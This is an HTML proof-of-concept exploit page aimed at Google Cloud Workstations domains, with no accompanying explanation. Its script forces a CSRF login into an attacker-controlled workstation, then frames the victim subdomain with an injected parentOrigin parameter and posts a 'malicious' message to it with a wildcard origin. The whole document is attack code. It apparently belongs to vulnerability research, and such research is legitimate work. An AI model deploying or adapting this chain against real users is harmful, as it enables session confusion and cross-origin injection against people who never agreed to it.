<!DOCTYPE html>
<html>
<body>
<script>
  const victimDomain = '[victim-subdomain].cloudworkstations.dev';
  const attackerDomain = '[attacker-subdomain].cloudworkstations.googleusercontent.com';
  // CSRF to log into attacker's workstation
  fetch(`${attackerDomain}/login`, { method: 'POST', credentials: 'include' });
  // Iframe and postMessage injection
  const iframe = document.createElement('iframe');
  iframe.src = `${victimDomain}/?parentOrigin=${window.origin}`;
  document.body.appendChild(iframe);
  iframe.onload = () => {
    iframe.contentWindow.postMessage({ malicious: 'payload' }, '*');
  };
</script>
</body>
</html>
